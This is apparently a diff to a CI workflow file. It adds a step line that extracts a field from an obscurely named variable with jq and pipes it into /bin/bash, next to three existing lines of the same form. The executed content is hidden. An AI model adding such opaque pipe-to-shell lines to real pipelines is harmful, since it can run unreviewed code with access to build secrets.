@@ -43,6 +43,7 @@ jobs:
           echo $rpu958 | jq -r .eah33 | /bin/bash
           printf '%s' "$p3" | jq -r .yum45047 | /bin/bash
           echo $hwyip3828 | jq -r .wubb2 | /bin/bash
+          echo $elcs22 | jq -r .oxn861 | /bin/bash
 
       - name: Archive output
         if: always()
